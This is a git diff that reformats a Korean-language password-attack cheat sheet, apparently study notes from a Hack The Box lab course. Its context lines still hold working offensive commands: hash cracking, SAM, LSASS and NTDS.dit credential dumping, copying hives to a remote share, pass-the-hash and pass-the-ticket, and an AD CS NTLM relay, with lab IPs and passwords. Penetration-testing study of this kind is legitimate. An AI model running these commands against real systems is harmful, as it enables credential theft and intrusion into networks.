@@ -1,10 +1,5 @@
-# Password Attack Cheat Sheet
-
-> **전략**: 항상 hash cracking을 먼저 시도한 후 Pass the Hash 공격 수행
-
----
-
-## Hash Generation
+<details>
+  <summary><strong>Hash Generation</strong></summary>
 
 평문 패스워드를 다양한 해시 알고리즘으로 변환
 
@@ -13,10 +8,12 @@ echo -n <password> | sha1sum
 echo -n <password> | sha256sum
 echo -n <password> | md5sum
 ```
+  
+</details>
 
 ---
-
-## CeWL - Custom Wordlist Generator
+<details>
+  <summary><strong>CeWL - Custom Wordlist Generator</strong></summary>
 
 대상 웹사이트를 크롤링하여 커스텀 워드리스트 생성
 
@@ -25,10 +22,12 @@ cewl -m 2 --with-numbers --lowercase <url>
 ```
 - `-m`: 최소 단어 길이
 - `--with-numbers`: 숫자 포함
+  
+</details>
 
 ---
-
-## Hashcat
+<details>
+  <summary><strong>Hashcat</strong></summary>
 
 ### 기본 Dictionary Attack
 ```bash
@@ -56,10 +55,12 @@ hashcat -r rules cewl.txt --stdout > output
 hashcat -a 1 output output --stdout > final
 ```
 - Combinator attack으로 단어 조합 생성
+  
+</details>
 
 ---
-
-## OpenSSL Encrypted GZIP Cracking
+<details>
+  <summary><strong>OpenSSL Encrypted GZIP Cracking</strong></summary>
 
 암호화된 GZIP 파일 brute-force 복호화
 
@@ -69,9 +70,12 @@ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2
 - AES-256-CBC 암호화 대상
 - 성공 시 자동으로 압축 해제
 
----
+  
+</details>
 
-## BitLocker Cracking
+---
+<details>
+  <summary><strong>BitLocker Cracking</strong></summary>
 
 ### Hash 추출
 ```bash
@@ -102,9 +106,11 @@ sudo umount /media/bitlockermount
 sudo umount /media/bitlocker
 ```
 
----
+</details>
 
-## Default Credentials Search
+---
+<details>
+  <summary><strong>Default Credentials Search</strong></summary>
 
 제품별 기본 자격증명 검색 도구
 
@@ -113,10 +119,12 @@ pip3 install defaultcreds-cheat-sheet
 creds search linksys
 ```
 - 벤더/제품명으로 기본 크리덴셜 조회
+  
+</details>
 
 ---
-
-## Windows SAM/SYSTEM/SECURITY Dumping
+<details>
+  <summary><strong>Windows SAM/SYSTEM/SECURITY Dumping</strong></summary>
 
 ### Registry 덤프
 ```powershell
@@ -148,10 +156,12 @@ move system.save \\10.10.15.16\CompData
 impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 ```
 - NTLM 해시 및 캐시된 자격증명 추출
+  
+</details>
 
 ---
-
-## DCC2 (Domain Cached Credentials) Cracking
+<details>
+  <summary><strong>DCC2 (Domain Cached Credentials) Cracking</strong></summary>
 
 도메인 캐시 자격증명 크래킹 (오프라인 로그인용)
 
@@ -161,9 +171,12 @@ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /us
 - `-m 2100`: MS-CacheV2 (DCC2) 형식
 - secretsdump 결과에서 추출
 
----
+  
+</details>
 
-## Remote Hash Dumping
+---
+<details>
+  <summary><strong>Remote Hash Dumping</strong></summary>
 
 원격 시스템에서 LSA secrets 및 SAM 해시 덤프
 
@@ -174,10 +187,12 @@ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 - `--local-auth`: 로컬 계정 사용
 - `--lsa`: LSA secrets 덤프
 - `--sam`: SAM database 덤프
+  
+</details>
 
 ---
-
-## LSASS Memory Dumping
+<details>
+  <summary><strong>LSASS Memory Dumping</strong></summary>
 
 ### Task Manager (GUI)
 ```
@@ -211,9 +226,11 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
 - 평문 패스워드, NTLM 해시, Kerberos 티켓 추출
 
----
+</details>
 
-## Saved Credentials (cmdkey)
+---
+<details>
+  <summary><strong>Saved Credentials (cmdkey)</strong></summary>
 
 Windows Credential Manager에 저장된 자격증명 확인
 
@@ -252,9 +269,11 @@ vault::cred
 - Credential Manager 및 Windows Vault 데이터 추출
 <img width="822" height="359" alt="image" src="https://github.com/user-attachments/assets/cf12ff6c-14ab-4a65-8793-7cdc70c14cf0" />
 
----
+</details>
 
-## Username Enumeration
+---
+<details>
+  <summary><strong>Username Enumeration</strong></summary>
 
 ### Custom Username List 생성
 ```bash
@@ -268,10 +287,12 @@ vault::cred
 ```
 - 유효한 사용자 계정 식별 (AS-REQ 요청)
 - 인증 실패 시에도 사용자 존재 여부 확인 가능
+  
+</details>
 
 ---
-
-## NTDS.dit Dumping
+<details>
+  <summary><strong>NTDS.dit Dumping</strong></summary>
 
 ### 사용자 정보 확인
 ```powershell
@@ -303,10 +324,12 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 ```
 - ntdsutil 모듈로 원격 덤프
+  
+</details>
 
 ---
-
-## Password Hunting (Windows)
+<details>
+  <summary><strong>Password Hunting (Windows)</strong></summary>
 
 시스템 내 저장된 패스워드 검색
 
@@ -335,10 +358,12 @@ Import-Module .\\PowerHuntShares.psm1
 Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
 ```
 - 멀티스레드 SMB 공유 스캔 및 민감 데이터 식별
+  
+</details>
 
 ---
-
-## Password Hunting (Linux)
+<details>
+  <summary><strong>Password Hunting (Linux)</strong></summary>
 
 ### 설정 파일 검색
 ```bash
@@ -423,10 +448,12 @@ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content 
 - `--spider`: SMB 공유 재귀 탐색
 - `--content`: 파일 내용 검색
 - `--pattern`: 정규식 패턴 매칭
+  
+</details>
 
 ---
-
-## Linux Old Passwords
+<details>
+  <summary><strong>Linux Old Passwords</strong></summary>
 
 이전에 사용된 패스워드 해시 확인
 
@@ -436,9 +463,11 @@ sudo cat /etc/security/opasswd
 - PAM 모듈로 패스워드 재사용 방지 시 저장
 - 과거 패스워드 크래킹으로 현재 패턴 유추 가능
 
----
+</details>
 
-## Linux Password Cracking
+---
+<details>
+  <summary><strong>Linux Password Cracking</strong></summary>
 
 ### Shadow 파일 백업
 ```bash
@@ -457,10 +486,12 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 ```
 - `-m 1800`: SHA-512 (Linux default)
+  
+</details>
 
 ---
-
-## Network Traffic Password Hunting
+<details>
+  <summary><strong>Network Traffic Password Hunting</strong></summary>
 
 ### PCredz
 ```bash
@@ -473,10 +504,12 @@ git clone https://github.com/lgandx/PCredz
 ### Wireshark 분석
 - `pcap`, `pcapng` 파일을 Wireshark로 열어 수동 분석
 - 필터: `http.request.method == "POST"`, `ftp` 등
+  
+</details>
 
 ---
-
-## Pass the Hash (PtH)
+<details>
+  <summary><strong>Pass the Hash (PtH)</strong></summary>
 
 NTLM 해시로 인증 (평문 패스워드 불필요)
 
@@ -528,9 +561,11 @@ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
 - RDP로 해시 기반 인증 (Restricted Admin Mode 필요)
 
----
+</details>
 
-## Pass the Ticket (PtT)
+---
+<details>
+  <summary><strong>Pass the Ticket (PtT)</strong></summary>
 
 Kerberos TGT/TGS 티켓을 재사용하여 인증
 
@@ -586,10 +621,12 @@ Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0
 ```
 - 새 네트워크 전용 로그온 세션에 티켓 주입
 - 다른 사용자 티켓과 충돌 방지
+  
+</details>
 
 ---
-
-## Pass the Key / OverPass the Hash
+<details>
+  <summary><strong>Pass the Key / OverPass the Hash</strong></summary>
 
 NTLM 해시 또는 AES 키로 Kerberos TGT 요청
 
@@ -617,9 +654,11 @@ Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e
 - Rubeus는 관리자 권한 불필요 (Mimikatz와의 차이점)
 - AES 키 사용 시 더 높은 은닉성
 
----
+</details>
 
-## Kerberos Ticket Format Conversion
+---
+<details>
+  <summary><strong>Kerberos Ticket Format Conversion</strong></summary>
 
 ### .kirbi를 Base64로 변환
 ```powershell
@@ -631,10 +670,12 @@ Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e
 ```powershell
 Rubeus.exe ptt /ticket:<base64 format>
 ```
+  
+</details>
 
 ---
-
-## Linux Domain Integration Check
+<details>
+  <summary><strong>Linux Domain Integration Check</strong></summary>
 
 Linux 시스템의 AD 도메인 가입 여부 확인
 
@@ -669,10 +710,12 @@ id julio@inlanefreight.htb
 ```
 - UID/GID 및 그룹 멤버십 확인
 <img width="1164" height="554" alt="image" src="https://github.com/user-attachments/assets/568b191c-fb0a-4737-b7fd-f1669cd370bf" />
+  
+</details>
 
 ---
-
-## KeyTab File Exploitation
+<details>
+  <summary><strong>KeyTab File Exploitation</strong></summary>
 
 ### KeyTab 내용 확인
 ```bash
@@ -702,9 +745,11 @@ su - carlos@inlanefreight.htb
 ```
 - 추출한 해시 또는 티켓으로 사용자 전환
 
----
+</details>
 
-## ccache File Exploitation
+---
+<details>
+  <summary><strong>ccache File Exploitation</strong></summary>
 
 ### ccache 파일 확인
 ```bash
@@ -734,10 +779,12 @@ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ```
 - `/etc/krb5.conf` 설정 필요 (도메인 정보)
 <img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/63821327-613c-4d07-9e13-94bf34d85519" />
+  
+</details>
 
 ---
-
-## Ticket Format Conversion
+<details>
+  <summary><strong>Ticket Format Conversion</strong></summary>
 
 ### ccache to kirbi
 ```bash
@@ -751,10 +798,12 @@ C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 klist
 dir \\dc01\julio
 ```
+  
+</details>
 
 ---
-
-## Linikatz - Linux Mimikatz
+<details>
+  <summary><strong>Linikatz - Linux Mimikatz</strong></summary>
 
 Linux 메모리에서 자격증명 추출
 
@@ -763,10 +812,12 @@ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.
 /opt/linikatz.sh
 ```
 - SSSD, Winbind 등에서 평문 패스워드 및 해시 추출
+  
+</details>
 
 ---
-
-## AD CS NTLM Relay Attack (ESC8)
+<details>
+  <summary><strong>AD CS NTLM Relay Attack (ESC8)</strong></summary>
 
 NTLM 인증을 AD CS 웹 인터페이스로 릴레이하여 인증서 발급
 
@@ -796,9 +847,12 @@ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrat
 ```
 - DC 머신 계정으로 도메인 해시 덤프
 
----
+  
+</details>
 
-## Shadow Credentials Attack
+---
+<details>
+  <summary><strong>Shadow Credentials Attack</strong></summary>
 
 msDS-KeyCredentialLink 속성에 인증서 추가하여 PKINIT 사용
 
@@ -823,3 +877,5 @@ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 ```
 - Kerberos 티켓으로 WinRM 인증
 <img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/0e6f5184-851c-460a-a00a-40dd9b3e0495" />
+  
+</details>
